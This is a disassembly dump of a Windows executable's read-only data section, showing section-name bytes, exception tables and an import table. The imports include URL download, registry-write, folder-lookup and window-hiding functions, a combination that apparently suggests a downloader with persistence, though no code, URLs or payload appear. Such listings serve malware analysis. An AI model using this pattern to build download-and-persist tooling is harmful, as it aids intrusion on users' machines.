.rdata:00403614                 db  2Eh ; .
.rdata:00403615                 db  43h ; C
.rdata:00403616                 db  52h ; R
.rdata:00403617                 db  54h ; T
.rdata:00403618                 db  24h ; $
.rdata:00403619                 db  58h ; X
.rdata:0040361A                 db  43h ; C
.rdata:0040361B                 db  5Ah ; Z
.rdata:0040361C                 db    0
.rdata:0040361D                 db    0
.rdata:0040361E                 db    0
.rdata:0040361F                 db    0
.rdata:00403620                 db  64h ; d
.rdata:00403621                 db  31h ; 1
.rdata:00403622                 db    0
.rdata:00403623                 db    0
.rdata:00403624                 db    4
.rdata:00403625                 db    0
.rdata:00403626                 db    0
.rdata:00403627                 db    0
.rdata:00403628                 db  2Eh ; .
.rdata:00403629                 db  43h ; C
.rdata:0040362A                 db  52h ; R
.rdata:0040362B                 db  54h ; T
.rdata:0040362C                 db  24h ; $
.rdata:0040362D                 db  58h ; X
.rdata:0040362E                 db  49h ; I
.rdata:0040362F                 db  41h ; A
.rdata:00403630                 db    0
.rdata:00403631                 db    0
.rdata:00403632                 db    0
.rdata:00403633                 db    0
.rdata:00403634                 db  68h ; h
.rdata:00403635                 db  31h ; 1
.rdata:00403636                 db    0
.rdata:00403637                 db    0
.rdata:00403638                 db    4
.rdata:00403639                 db    0
.rdata:0040363A                 db    0
.rdata:0040363B                 db    0
.rdata:0040363C                 db  2Eh ; .
.rdata:0040363D                 db  43h ; C
.rdata:0040363E                 db  52h ; R
.rdata:0040363F                 db  54h ; T
.rdata:00403640                 db  24h ; $
.rdata:00403641                 db  58h ; X
.rdata:00403642                 db  49h ; I
.rdata:00403643                 db  41h ; A
.rdata:00403644                 db  41h ; A
.rdata:00403645                 db    0
.rdata:00403646                 db    0
.rdata:00403647                 db    0
.rdata:00403648                 db  6Ch ; l
.rdata:00403649                 db  31h ; 1
.rdata:0040364A                 db    0
.rdata:0040364B                 db    0
.rdata:0040364C                 db    4
.rdata:0040364D                 db    0
.rdata:0040364E                 db    0
.rdata:0040364F                 db    0
.rdata:00403650                 db  2Eh ; .
.rdata:00403651                 db  43h ; C
.rdata:00403652                 db  52h ; R
.rdata:00403653                 db  54h ; T
.rdata:00403654                 db  24h ; $
.rdata:00403655                 db  58h ; X
.rdata:00403656                 db  49h ; I
.rdata:00403657                 db  41h ; A
.rdata:00403658                 db  43h ; C
.rdata:00403659                 db    0
.rdata:0040365A                 db    0
.rdata:0040365B                 db    0
.rdata:0040365C                 db  70h ; p
.rdata:0040365D                 db  31h ; 1
.rdata:0040365E                 db    0
.rdata:0040365F                 db    0
.rdata:00403660                 db    4
.rdata:00403661                 db    0
.rdata:00403662                 db    0
.rdata:00403663                 db    0
.rdata:00403664                 db  2Eh ; .
.rdata:00403665                 db  43h ; C
.rdata:00403666                 db  52h ; R
.rdata:00403667                 db  54h ; T
.rdata:00403668                 db  24h ; $
.rdata:00403669                 db  58h ; X
.rdata:0040366A                 db  49h ; I
.rdata:0040366B                 db  5Ah ; Z
.rdata:0040366C                 db    0
.rdata:0040366D                 db    0
.rdata:0040366E                 db    0
.rdata:0040366F                 db    0
.rdata:00403670                 db  74h ; t
.rdata:00403671                 db  31h ; 1
.rdata:00403672                 db    0
.rdata:00403673                 db    0
.rdata:00403674                 db    4
.rdata:00403675                 db    0
.rdata:00403676                 db    0
.rdata:00403677                 db    0
.rdata:00403678                 db  2Eh ; .
.rdata:00403679                 db  43h ; C
.rdata:0040367A                 db  52h ; R
.rdata:0040367B                 db  54h ; T
.rdata:0040367C                 db  24h ; $
.rdata:0040367D                 db  58h ; X
.rdata:0040367E                 db  50h ; P
.rdata:0040367F                 db  41h ; A
.rdata:00403680                 db    0
.rdata:00403681                 db    0
.rdata:00403682                 db    0
.rdata:00403683                 db    0
.rdata:00403684                 db  78h ; x
.rdata:00403685                 db  31h ; 1
.rdata:00403686                 db    0
.rdata:00403687                 db    0
.rdata:00403688                 db    4
.rdata:00403689                 db    0
.rdata:0040368A                 db    0
.rdata:0040368B                 db    0
.rdata:0040368C                 db  2Eh ; .
.rdata:0040368D                 db  43h ; C
.rdata:0040368E                 db  52h ; R
.rdata:0040368F                 db  54h ; T
.rdata:00403690                 db  24h ; $
.rdata:00403691                 db  58h ; X
.rdata:00403692                 db  50h ; P
.rdata:00403693                 db  5Ah ; Z
.rdata:00403694                 db    0
.rdata:00403695                 db    0
.rdata:00403696                 db    0
.rdata:00403697                 db    0
.rdata:00403698                 db  7Ch ; |
.rdata:00403699                 db  31h ; 1
.rdata:0040369A                 db    0
.rdata:0040369B                 db    0
.rdata:0040369C                 db    4
.rdata:0040369D                 db    0
.rdata:0040369E                 db    0
.rdata:0040369F                 db    0
.rdata:004036A0                 db  2Eh ; .
.rdata:004036A1                 db  43h ; C
.rdata:004036A2                 db  52h ; R
.rdata:004036A3                 db  54h ; T
.rdata:004036A4                 db  24h ; $
.rdata:004036A5                 db  58h ; X
.rdata:004036A6                 db  54h ; T
.rdata:004036A7                 db  41h ; A
.rdata:004036A8                 db    0
.rdata:004036A9                 db    0
.rdata:004036AA                 db    0
.rdata:004036AB                 db    0
.rdata:004036AC                 db  80h
.rdata:004036AD                 db  31h ; 1
.rdata:004036AE                 db    0
.rdata:004036AF                 db    0
.rdata:004036B0                 db    8
.rdata:004036B1                 db    0
.rdata:004036B2                 db    0
.rdata:004036B3                 db    0
.rdata:004036B4                 db  2Eh ; .
.rdata:004036B5                 db  43h ; C
.rdata:004036B6                 db  52h ; R
.rdata:004036B7                 db  54h ; T
.rdata:004036B8                 db  24h ; $
.rdata:004036B9                 db  58h ; X
.rdata:004036BA                 db  54h ; T
.rdata:004036BB                 db  5Ah ; Z
.rdata:004036BC                 db    0
.rdata:004036BD                 db    0
.rdata:004036BE                 db    0
.rdata:004036BF                 db    0
.rdata:004036C0                 db  88h
.rdata:004036C1                 db  31h ; 1
.rdata:004036C2                 db    0
.rdata:004036C3                 db    0
.rdata:004036C4                 db  38h ; 8
.rdata:004036C5                 db    3
.rdata:004036C6                 db    0
.rdata:004036C7                 db    0
.rdata:004036C8                 db  2Eh ; .
.rdata:004036C9                 db  72h ; r
.rdata:004036CA                 db  64h ; d
.rdata:004036CB                 db  61h ; a
.rdata:004036CC                 db  74h ; t
.rdata:004036CD                 db  61h ; a
.rdata:004036CE                 db    0
.rdata:004036CF                 db    0
.rdata:004036D0                 db 0C0h
.rdata:004036D1                 db  34h ; 4
.rdata:004036D2                 db    0
.rdata:004036D3                 db    0
.rdata:004036D4                 db    4
.rdata:004036D5                 db    0
.rdata:004036D6                 db    0
.rdata:004036D7                 db    0
.rdata:004036D8                 db  2Eh ; .
.rdata:004036D9                 db  72h ; r
.rdata:004036DA                 db  64h ; d
.rdata:004036DB                 db  61h ; a
.rdata:004036DC                 db  74h ; t
.rdata:004036DD                 db  61h ; a
.rdata:004036DE                 db  24h ; $
.rdata:004036DF                 db  73h ; s
.rdata:004036E0                 db  78h ; x
.rdata:004036E1                 db  64h ; d
.rdata:004036E2                 db  61h ; a
.rdata:004036E3                 db  74h ; t
.rdata:004036E4                 db  61h ; a
.rdata:004036E5                 db    0
.rdata:004036E6                 db    0
.rdata:004036E7                 db    0
.rdata:004036E8                 db 0C4h
.rdata:004036E9                 db  34h ; 4
.rdata:004036EA                 db    0
.rdata:004036EB                 db    0
.rdata:004036EC                 db  6Ch ; l
.rdata:004036ED                 db    0
.rdata:004036EE                 db    0
.rdata:004036EF                 db    0
.rdata:004036F0                 db  2Eh ; .
.rdata:004036F1                 db  72h ; r
.rdata:004036F2                 db  64h ; d
.rdata:004036F3                 db  61h ; a
.rdata:004036F4                 db  74h ; t
.rdata:004036F5                 db  61h ; a
.rdata:004036F6                 db  24h ; $
.rdata:004036F7                 db  76h ; v
.rdata:004036F8                 db  6Fh ; o
.rdata:004036F9                 db  6Ch ; l
.rdata:004036FA                 db  74h ; t
.rdata:004036FB                 db  6Dh ; m
.rdata:004036FC                 db  64h ; d
.rdata:004036FD                 db    0
.rdata:004036FE                 db    0
.rdata:004036FF                 db    0
.rdata:00403700                 db  30h ; 0
.rdata:00403701                 db  35h ; 5
.rdata:00403702                 db    0
.rdata:00403703                 db    0
.rdata:00403704                 db 0E4h
.rdata:00403705                 db    2
.rdata:00403706                 db    0
.rdata:00403707                 db    0
.rdata:00403708                 db  2Eh ; .
.rdata:00403709                 db  72h ; r
.rdata:0040370A                 db  64h ; d
.rdata:0040370B                 db  61h ; a
.rdata:0040370C                 db  74h ; t
.rdata:0040370D                 db  61h ; a
.rdata:0040370E                 db  24h ; $
.rdata:0040370F                 db  7Ah ; z
.rdata:00403710                 db  7Ah ; z
.rdata:00403711                 db  7Ah ; z
.rdata:00403712                 db  64h ; d
.rdata:00403713                 db  62h ; b
.rdata:00403714                 db  67h ; g
.rdata:00403715                 db    0
.rdata:00403716                 db    0
.rdata:00403717                 db    0
.rdata:00403718                 db  14h
.rdata:00403719                 db  38h ; 8
.rdata:0040371A                 db    0
.rdata:0040371B                 db    0
.rdata:0040371C                 db    4
.rdata:0040371D                 db    0
.rdata:0040371E                 db    0
.rdata:0040371F                 db    0
.rdata:00403720                 db  2Eh ; .
.rdata:00403721                 db  72h ; r
.rdata:00403722                 db  74h ; t
.rdata:00403723                 db  63h ; c
.rdata:00403724                 db  24h ; $
.rdata:00403725                 db  49h ; I
.rdata:00403726                 db  41h ; A
.rdata:00403727                 db  41h ; A
.rdata:00403728                 db    0
.rdata:00403729                 db    0
.rdata:0040372A                 db    0
.rdata:0040372B                 db    0
.rdata:0040372C                 db  18h
.rdata:0040372D                 db  38h ; 8
.rdata:0040372E                 db    0
.rdata:0040372F                 db    0
.rdata:00403730                 db    4
.rdata:00403731                 db    0
.rdata:00403732                 db    0
.rdata:00403733                 db    0
.rdata:00403734                 db  2Eh ; .
.rdata:00403735                 db  72h ; r
.rdata:00403736                 db  74h ; t
.rdata:00403737                 db  63h ; c
.rdata:00403738                 db  24h ; $
.rdata:00403739                 db  49h ; I
.rdata:0040373A                 db  5Ah ; Z
.rdata:0040373B                 db  5Ah ; Z
.rdata:0040373C                 db    0
.rdata:0040373D                 db    0
.rdata:0040373E                 db    0
.rdata:0040373F                 db    0
.rdata:00403740                 db  1Ch
.rdata:00403741                 db  38h ; 8
.rdata:00403742                 db    0
.rdata:00403743                 db    0
.rdata:00403744                 db    4
.rdata:00403745                 db    0
.rdata:00403746                 db    0
.rdata:00403747                 db    0
.rdata:00403748                 db  2Eh ; .
.rdata:00403749                 db  72h ; r
.rdata:0040374A                 db  74h ; t
.rdata:0040374B                 db  63h ; c
.rdata:0040374C                 db  24h ; $
.rdata:0040374D                 db  54h ; T
.rdata:0040374E                 db  41h ; A
.rdata:0040374F                 db  41h ; A
.rdata:00403750                 db    0
.rdata:00403751                 db    0
.rdata:00403752                 db    0
.rdata:00403753                 db    0
.rdata:00403754                 db  20h
.rdata:00403755                 db  38h ; 8
.rdata:00403756                 db    0
.rdata:00403757                 db    0
.rdata:00403758                 db    8
.rdata:00403759                 db    0
.rdata:0040375A                 db    0
.rdata:0040375B                 db    0
.rdata:0040375C                 db  2Eh ; .
.rdata:0040375D                 db  72h ; r
.rdata:0040375E                 db  74h ; t
.rdata:0040375F                 db  63h ; c
.rdata:00403760                 db  24h ; $
.rdata:00403761                 db  54h ; T
.rdata:00403762                 db  5Ah ; Z
.rdata:00403763                 db  5Ah ; Z
.rdata:00403764                 db    0
.rdata:00403765                 db    0
.rdata:00403766                 db    0
.rdata:00403767                 db    0
.rdata:00403768                 db  28h ; (
.rdata:00403769                 db  38h ; 8
.rdata:0040376A                 db    0
.rdata:0040376B                 db    0
.rdata:0040376C                 db  3Ch ; <
.rdata:0040376D                 db    0
.rdata:0040376E                 db    0
.rdata:0040376F                 db    0
.rdata:00403770                 db  2Eh ; .
.rdata:00403771                 db  78h ; x
.rdata:00403772                 db  64h ; d
.rdata:00403773                 db  61h ; a
.rdata:00403774                 db  74h ; t
.rdata:00403775                 db  61h ; a
.rdata:00403776                 db  24h ; $
.rdata:00403777                 db  78h ; x
.rdata:00403778                 db    0
.rdata:00403779                 db    0
.rdata:0040377A                 db    0
.rdata:0040377B                 db    0
.rdata:0040377C                 db  64h ; d
.rdata:0040377D                 db  38h ; 8
.rdata:0040377E                 db    0
.rdata:0040377F                 db    0
.rdata:00403780                 db 0F0h
.rdata:00403781                 db    0
.rdata:00403782                 db    0
.rdata:00403783                 db    0
.rdata:00403784                 db  2Eh ; .
.rdata:00403785                 db  69h ; i
.rdata:00403786                 db  64h ; d
.rdata:00403787                 db  61h ; a
.rdata:00403788                 db  74h ; t
.rdata:00403789                 db  61h ; a
.rdata:0040378A                 db  24h ; $
.rdata:0040378B                 db  32h ; 2
.rdata:0040378C                 db    0
.rdata:0040378D                 db    0
.rdata:0040378E                 db    0
.rdata:0040378F                 db    0
.rdata:00403790                 db  54h ; T
.rdata:00403791                 db  39h ; 9
.rdata:00403792                 db    0
.rdata:00403793                 db    0
.rdata:00403794                 db  14h
.rdata:00403795                 db    0
.rdata:00403796                 db    0
.rdata:00403797                 db    0
.rdata:00403798                 db  2Eh ; .
.rdata:00403799                 db  69h ; i
.rdata:0040379A                 db  64h ; d
.rdata:0040379B                 db  61h ; a
.rdata:0040379C                 db  74h ; t
.rdata:0040379D                 db  61h ; a
.rdata:0040379E                 db  24h ; $
.rdata:0040379F                 db  33h ; 3
.rdata:004037A0                 db    0
.rdata:004037A1                 db    0
.rdata:004037A2                 db    0
.rdata:004037A3                 db    0
.rdata:004037A4                 db  68h ; h
.rdata:004037A5                 db  39h ; 9
.rdata:004037A6                 db    0
.rdata:004037A7                 db    0
.rdata:004037A8                 db  50h ; P
.rdata:004037A9                 db    1
.rdata:004037AA                 db    0
.rdata:004037AB                 db    0
.rdata:004037AC                 db  2Eh ; .
.rdata:004037AD                 db  69h ; i
.rdata:004037AE                 db  64h ; d
.rdata:004037AF                 db  61h ; a
.rdata:004037B0                 db  74h ; t
.rdata:004037B1                 db  61h ; a
.rdata:004037B2                 db  24h ; $
.rdata:004037B3                 db  34h ; 4
.rdata:004037B4                 db    0
.rdata:004037B5                 db    0
.rdata:004037B6                 db    0
.rdata:004037B7                 db    0
.rdata:004037B8                 db 0B8h
.rdata:004037B9                 db  3Ah ; :
.rdata:004037BA                 db    0
.rdata:004037BB                 db    0
.rdata:004037BC                 db  78h ; x
.rdata:004037BD                 db    6
.rdata:004037BE                 db    0
.rdata:004037BF                 db    0
.rdata:004037C0                 db  2Eh ; .
.rdata:004037C1                 db  69h ; i
.rdata:004037C2                 db  64h ; d
.rdata:004037C3                 db  61h ; a
.rdata:004037C4                 db  74h ; t
.rdata:004037C5                 db  61h ; a
.rdata:004037C6                 db  24h ; $
.rdata:004037C7                 db  36h ; 6
.rdata:004037C8                 db    0
.rdata:004037C9                 db    0
.rdata:004037CA                 db    0
.rdata:004037CB                 db    0
.rdata:004037CC                 db    0
.rdata:004037CD                 db  50h ; P
.rdata:004037CE                 db    0
.rdata:004037CF                 db    0
.rdata:004037D0                 db  60h ; `
.rdata:004037D1                 db    0
.rdata:004037D2                 db    0
.rdata:004037D3                 db    0
.rdata:004037D4                 db  2Eh ; .
.rdata:004037D5                 db  64h ; d
.rdata:004037D6                 db  61h ; a
.rdata:004037D7                 db  74h ; t
.rdata:004037D8                 db  61h ; a
.rdata:004037D9                 db    0
.rdata:004037DA                 db    0
.rdata:004037DB                 db    0
.rdata:004037DC                 db  60h ; `
.rdata:004037DD                 db  50h ; P
.rdata:004037DE                 db    0
.rdata:004037DF                 db    0
.rdata:004037E0                 db  70h ; p
.rdata:004037E1                 db    3
.rdata:004037E2                 db    0
.rdata:004037E3                 db    0
.rdata:004037E4                 db  2Eh ; .
.rdata:004037E5                 db  62h ; b
.rdata:004037E6                 db  73h ; s
.rdata:004037E7                 db  73h ; s
.rdata:004037E8                 db    0
.rdata:004037E9                 db    0
.rdata:004037EA                 db    0
.rdata:004037EB                 db    0
.rdata:004037EC                 db    0
.rdata:004037ED                 db  60h ; `
.rdata:004037EE                 db    0
.rdata:004037EF                 db    0
.rdata:004037F0                 db 0A0h
.rdata:004037F1                 db    0
.rdata:004037F2                 db    0
.rdata:004037F3                 db    0
.rdata:004037F4                 db  2Eh ; .
.rdata:004037F5                 db  72h ; r
.rdata:004037F6                 db  73h ; s
.rdata:004037F7                 db  72h ; r
.rdata:004037F8                 db  63h ; c
.rdata:004037F9                 db  24h ; $
.rdata:004037FA                 db  30h ; 0
.rdata:004037FB                 db  31h ; 1
.rdata:004037FC                 db    0
.rdata:004037FD                 db    0
.rdata:004037FE                 db    0
.rdata:004037FF                 db    0
.rdata:00403800                 db 0A0h
.rdata:00403801                 db  60h ; `
.rdata:00403802                 db    0
.rdata:00403803                 db    0
.rdata:00403804                 db  80h
.rdata:00403805                 db  29h ; )
.rdata:00403806                 db    0
.rdata:00403807                 db    0
.rdata:00403808                 db  2Eh ; .
.rdata:00403809                 db  72h ; r
.rdata:0040380A                 db  73h ; s
.rdata:0040380B                 db  72h ; r
.rdata:0040380C                 db  63h ; c
.rdata:0040380D                 db  24h ; $
.rdata:0040380E                 db  30h ; 0
.rdata:0040380F                 db  32h ; 2
.rdata:00403810                 db    0
.rdata:00403811                 db    0
.rdata:00403812                 db    0
.rdata:00403813                 db    0
.rdata:00403814                 db    0
.rdata:00403815                 db    0
.rdata:00403816                 db    0
.rdata:00403817                 db    0
.rdata:00403818 unk_403818      db    0                 ; DATA XREF: sub_401C40+2↑o
.rdata:00403818                                         ; sub_401C40+7↑o
.rdata:00403819                 db    0
.rdata:0040381A                 db    0
.rdata:0040381B                 db    0
.rdata:0040381C                 db    0
.rdata:0040381D                 db    0
.rdata:0040381E                 db    0
.rdata:0040381F                 db    0
.rdata:00403820 unk_403820      db    0                 ; DATA XREF: sub_401C6C+2↑o
.rdata:00403820                                         ; sub_401C6C+7↑o
.rdata:00403821                 db    0
.rdata:00403822                 db    0
.rdata:00403823                 db    0
.rdata:00403824                 db    0
.rdata:00403825                 db    0
.rdata:00403826                 db    0
.rdata:00403827                 db    0
.rdata:00403828 stru_403828     _EH4_SCOPETABLE <0FFFFFFFEh, 0, 0FFFFFFCCh, 0, <0FFFFFFFEh, \
.rdata:00403828                                         ; DATA XREF: __scrt_common_main_seh(void)+2↑o
.rdata:00403828                                  offset loc_40158E, offset loc_4015A2>>
.rdata:00403844                 align 8
.rdata:00403848 stru_403848     _EH4_SCOPETABLE <0FFFFFFFEh, 0, 0FFFFFFD8h, 0, <0FFFFFFFEh, \
.rdata:00403848                                         ; DATA XREF: ___scrt_is_nonwritable_in_current_image+2↑o
.rdata:00403848                                  offset loc_4018B1, offset loc_4018C4>>
.rdata:00403864 __IMPORT_DESCRIPTOR_KERNEL32 dd 0       ; Import Name Table
.rdata:00403868                 dd 0                    ; Time stamp
.rdata:0040386C                 dd 0                    ; Forwarder Chain
.rdata:00403870                 dd rva aKernel32Dll     ; DLL Name
.rdata:00403874                 dd rva CreateFileW      ; Import Address Table
.rdata:00403878 __IMPORT_DESCRIPTOR_ADVAPI32 dd 0       ; Import Name Table
.rdata:0040387C                 dd 0                    ; Time stamp
.rdata:00403880                 dd 0                    ; Forwarder Chain
.rdata:00403884                 dd rva aAdvapi32Dll     ; DLL Name
.rdata:00403888                 dd rva RegSetValueExW   ; Import Address Table
.rdata:0040388C                 dd 0                    ; Import Name Table
.rdata:00403890                 dd 0                    ; Time stamp
.rdata:00403894                 dd 0                    ; Forwarder Chain
.rdata:00403898                 dd rva aApiMsWinCrtHea  ; DLL Name
.rdata:0040389C                 dd rva __imp__set_new_mode ; Import Address Table
.rdata:004038A0                 dd 0                    ; Import Name Table
.rdata:004038A4                 dd 0                    ; Time stamp
.rdata:004038A8                 dd 0                    ; Forwarder Chain
.rdata:004038AC                 dd rva aApiMsWinCrtLoc  ; DLL Name
.rdata:004038B0                 dd rva __imp__configthreadlocale ; Import Address Table
.rdata:004038B4                 dd 0                    ; Import Name Table
.rdata:004038B8                 dd 0                    ; Time stamp
.rdata:004038BC                 dd 0                    ; Forwarder Chain
.rdata:004038C0                 dd rva aApiMsWinCrtMat  ; DLL Name
.rdata:004038C4                 dd rva __imp___setusermatherr ; Import Address Table
.rdata:004038C8                 dd 0                    ; Import Name Table
.rdata:004038CC                 dd 0                    ; Time stamp
.rdata:004038D0                 dd 0                    ; Forwarder Chain
.rdata:004038D4                 dd rva aApiMsWinCrtRun  ; DLL Name
.rdata:004038D8                 dd rva __imp___p___argv ; Import Address Table
.rdata:004038DC                 dd 0                    ; Import Name Table
.rdata:004038E0                 dd 0                    ; Time stamp
.rdata:004038E4                 dd 0                    ; Forwarder Chain
.rdata:004038E8                 dd rva aApiMsWinCrtStd  ; DLL Name
.rdata:004038EC                 dd rva __stdio_common_vfprintf ; Import Address Table
.rdata:004038F0                 dd 0                    ; Import Name Table
.rdata:004038F4                 dd 0                    ; Time stamp
.rdata:004038F8                 dd 0                    ; Forwarder Chain
.rdata:004038FC                 dd rva aApiMsWinCrtStr  ; DLL Name
.rdata:00403900                 dd rva wcscat_s         ; Import Address Table
.rdata:00403904 __IMPORT_DESCRIPTOR_SHELL32 dd 0        ; Import Name Table
.rdata:00403908                 dd 0                    ; Time stamp
.rdata:0040390C                 dd 0                    ; Forwarder Chain
.rdata:00403910                 dd rva aShell32Dll      ; DLL Name
.rdata:00403914                 dd rva SHGetFolderPathW ; Import Address Table
.rdata:00403918 __IMPORT_DESCRIPTOR_urlmon dd 0         ; Import Name Table
.rdata:0040391C                 dd 0                    ; Time stamp
.rdata:00403920                 dd 0                    ; Forwarder Chain
.rdata:00403924                 dd rva aUrlmonDll       ; DLL Name
.rdata:00403928                 dd rva URLDownloadToFileW ; Import Address Table
.rdata:0040392C __IMPORT_DESCRIPTOR_USER32 dd 0         ; Import Name Table
.rdata:00403930                 dd 0                    ; Time stamp
.rdata:00403934                 dd 0                    ; Forwarder Chain
.rdata:00403938                 dd rva aUser32Dll       ; DLL Name
.rdata:0040393C                 dd rva ShowWindow       ; Import Address Table
.rdata:00403940 __IMPORT_DESCRIPTOR_VCRUNTIME140 dd 0   ; Import Name Table
.rdata:00403944                 dd 0                    ; Time stamp
.rdata:00403948                 dd 0                    ; Forwarder Chain
.rdata:0040394C                 dd rva aVcruntime140Dl  ; DLL Name
.rdata:00403950                 dd rva __imp___current_exception ; Import Address Table
.rdata:00403954                 db    0
.rdata:00403955                 db    0
.rdata:00403956                 db    0
.rdata:00403957                 db    0
.rdata:00403958                 db    0
.rdata:00403959                 db    0
.rdata:0040395A                 db    0
.rdata:0040395B                 db    0
.rdata:0040395C                 db    0
.rdata:0040395D                 db    0
.rdata:0040395E                 db    0
.rdata:0040395F                 db    0
.rdata:00403960                 db    0
.rdata:00403961                 db    0
.rdata:00403962                 db    0
.rdata:00403963                 db    0
.rdata:00403964                 db    0
.rdata:00403965                 db    0
.rdata:00403966                 db    0
.rdata:00403967                 db    0
.rdata:00403968                 db  72h ; r
.rdata:00403969                 db  3Ch ; <
.rdata:0040396A                 db    0
.rdata:0040396B                 db    0
.rdata:0040396C                 db  62h ; b
.rdata:0040396D                 db  3Ch ; <
.rdata:0040396E                 db    0
.rdata:0040396F                 db    0
.rdata:00403970                 db  84h
.rdata:00403971                 db  3Ch ; <
.rdata:00403972                 db    0
.rdata:00403973                 db    0
.rdata:00403974                 db    0
.rdata:00403975                 db    0
.rdata:00403976                 db    0
.rdata:00403977                 db    0
.rdata:00403978                 db    2
.rdata:00403979                 db  3Bh ; ;
.rdata:0040397A                 db    0
.rdata:0040397B                 db    0
.rdata:0040397C                 db  10h
.rdata:0040397D                 db  3Bh ; ;
.rdata:0040397E                 db    0
.rdata:0040397F                 db    0
.rdata:00403980                 db  1Eh
.rdata:00403981                 db  3Bh ; ;
.rdata:00403982                 db    0
.rdata:00403983                 db    0
.rdata:00403984                 db  34h ; 4
.rdata:00403985                 db  3Bh ; ;
.rdata:00403986                 db    0
.rdata:00403987                 db    0
.rdata:00403988                 db  50h ; P
.rdata:00403989                 db  3Bh ; ;
.rdata:0040398A                 db    0
.rdata:0040398B                 db    0
.rdata:0040398C                 db  62h ; b
.rdata:0040398D                 db  3Bh ; ;
.rdata:0040398E                 db    0
.rdata:0040398F                 db    0
.rdata:00403990                 db  72h ; r
.rdata:00403991                 db  3Bh ; ;
.rdata:00403992                 db    0
.rdata:00403993                 db    0
.rdata:00403994                 db  84h
.rdata:00403995                 db  3Bh ; ;
.rdata:00403996                 db    0
.rdata:00403997                 db    0
.rdata:00403998                 db  92h
.rdata:00403999                 db  3Bh ; ;
.rdata:0040399A                 db    0
.rdata:0040399B                 db    0
.rdata:0040399C                 db 0A2h
.rdata:0040399D                 db  3Bh ; ;
.rdata:0040399E                 db    0
.rdata:0040399F                 db    0
.rdata:004039A0                 db 0ECh
.rdata:004039A1                 db  3Ah ; :
.rdata:004039A2                 db    0
.rdata:004039A3                 db    0
.rdata:004039A4                 db 0C4h
.rdata:004039A5                 db  3Bh ; ;
.rdata:004039A6                 db    0
.rdata:004039A7                 db    0
.rdata:004039A8                 db 0D6h
.rdata:004039A9                 db  3Bh ; ;
.rdata:004039AA                 db    0
.rdata:004039AB                 db    0
.rdata:004039AC                 db 0EAh
.rdata:004039AD                 db  3Bh ; ;
.rdata:004039AE                 db    0
.rdata:004039AF                 db    0
.rdata:004039B0                 db 0F6h
.rdata:004039B1                 db  3Bh ; ;
.rdata:004039B2                 db    0
.rdata:004039B3                 db    0
.rdata:004039B4                 db  0Ch
.rdata:004039B5                 db  3Ch ; <
.rdata:004039B6                 db    0
.rdata:004039B7                 db    0
.rdata:004039B8                 db  1Ch
.rdata:004039B9                 db  3Ch ; <
.rdata:004039BA                 db    0
.rdata:004039BB                 db    0
.rdata:004039BC                 db  1Ch
.rdata:004039BD                 db  41h ; A
.rdata:004039BE                 db    0
.rdata:004039BF                 db    0
.rdata:004039C0                 db    6
.rdata:004039C1                 db  41h ; A
.rdata:004039C2                 db    0
.rdata:004039C3                 db    0
.rdata:004039C4                 db 0ECh
.rdata:004039C5                 db  40h ; @
.rdata:004039C6                 db    0
.rdata:004039C7                 db    0
.rdata:004039C8                 db 0D6h
.rdata:004039C9                 db  40h ; @
.rdata:004039CA                 db    0
.rdata:004039CB                 db    0
.rdata:004039CC                 db 0E0h
.rdata:004039CD                 db  3Ah ; :
.rdata:004039CE                 db    0
.rdata:004039CF                 db    0
.rdata:004039D0                 db 0CAh
.rdata:004039D1                 db  3Ah ; :
.rdata:004039D2                 db    0
.rdata:004039D3                 db    0
.rdata:004039D4                 db 0B2h
.rdata:004039D5                 db  3Bh ; ;
.rdata:004039D6                 db    0
.rdata:004039D7                 db    0
.rdata:004039D8                 db 0B8h
.rdata:004039D9                 db  3Ah ; :
.rdata:004039DA                 db    0
.rdata:004039DB                 db    0
.rdata:004039DC                 db 0C0h
.rdata:004039DD                 db  40h ; @
.rdata:004039DE                 db    0
.rdata:004039DF                 db    0
.rdata:004039E0                 db 0A6h
.rdata:004039E1                 db  40h ; @
.rdata:004039E2                 db    0
.rdata:004039E3                 db    0
.rdata:004039E4                 db  8Ah
.rdata:004039E5                 db  40h ; @
.rdata:004039E6                 db    0
.rdata:004039E7                 db    0
.rdata:004039E8                 db  76h ; v
.rdata:004039E9                 db  40h ; @
.rdata:004039EA                 db    0
.rdata:004039EB                 db    0
.rdata:004039EC                 db  62h ; b
.rdata:004039ED                 db  40h ; @
.rdata:004039EE                 db    0
.rdata:004039EF                 db    0
.rdata:004039F0                 db  44h ; D
.rdata:004039F1                 db  40h ; @
.rdata:004039F2                 db    0
.rdata:004039F3                 db    0
.rdata:004039F4                 db  28h ; (
.rdata:004039F5                 db  40h ; @
.rdata:004039F6                 db    0
.rdata:004039F7                 db    0
.rdata:004039F8                 db    0
.rdata:004039F9                 db    0
.rdata:004039FA                 db    0
.rdata:004039FB                 db    0
.rdata:004039FC                 db 0B0h
.rdata:004039FD                 db  3Ch ; <
.rdata:004039FE                 db    0
.rdata:004039FF                 db    0
.rdata:00403A00                 db 0A0h
.rdata:00403A01                 db  3Ch ; <
.rdata:00403A02                 db    0
.rdata:00403A03                 db    0
.rdata:00403A04                 db    0
.rdata:00403A05                 db    0
.rdata:00403A06                 db    0
.rdata:00403A07                 db    0
.rdata:00403A08                 db  48h ; H
.rdata:00403A09                 db  3Ch ; <
.rdata:00403A0A                 db    0
.rdata:00403A0B                 db    0
.rdata:00403A0C                 db  3Ah ; :
.rdata:00403A0D                 db  3Ch ; <
.rdata:00403A0E                 db    0
.rdata:00403A0F                 db    0
.rdata:00403A10                 db    0
.rdata:00403A11                 db    0
.rdata:00403A12                 db    0
.rdata:00403A13                 db    0
.rdata:00403A14                 db 0F2h
.rdata:00403A15                 db  3Ch ; <
.rdata:00403A16                 db    0
.rdata:00403A17                 db    0
.rdata:00403A18                 db    8
.rdata:00403A19                 db  3Dh ; =
.rdata:00403A1A                 db    0
.rdata:00403A1B                 db    0
.rdata:00403A1C                 db  30h ; 0
.rdata:00403A1D                 db  3Dh ; =
.rdata:00403A1E                 db    0
.rdata:00403A1F                 db    0
.rdata:00403A20                 db  26h ; &
.rdata:00403A21                 db  3Dh ; =
.rdata:00403A22                 db    0
.rdata:00403A23                 db    0
.rdata:00403A24                 db    0
.rdata:00403A25                 db    0
.rdata:00403A26                 db    0
.rdata:00403A27                 db    0
.rdata:00403A28                 db 0E0h
.rdata:00403A29                 db  3Eh ; >
.rdata:00403A2A                 db    0
.rdata:00403A2B                 db    0
.rdata:00403A2C                 db    0
.rdata:00403A2D                 db    0
.rdata:00403A2E                 db    0
.rdata:00403A2F                 db    0
.rdata:00403A30                 db 0CAh
.rdata:00403A31                 db  3Eh ; >
.rdata:00403A32                 db    0
.rdata:00403A33                 db    0
.rdata:00403A34                 db    0
